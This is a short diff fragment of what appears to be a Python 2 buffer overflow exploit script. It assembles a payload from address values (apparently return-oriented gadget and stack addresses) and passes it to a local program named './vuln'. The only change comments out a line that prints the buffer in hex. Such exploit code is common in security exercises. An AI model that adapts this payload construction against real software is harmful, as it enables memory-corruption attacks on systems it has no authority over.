@@ -213,7 +213,7 @@ buf += conv(pr_addr)
 buf += conv(cust_base_esp)                   
 buf += conv(lr_addr)                  
 
-print ':'.join(x.encode('hex') for x in buf)
+#print ':'.join(x.encode('hex') for x in buf)
  
 print "Calling vulnerable program"
 call(["./vuln", buf])
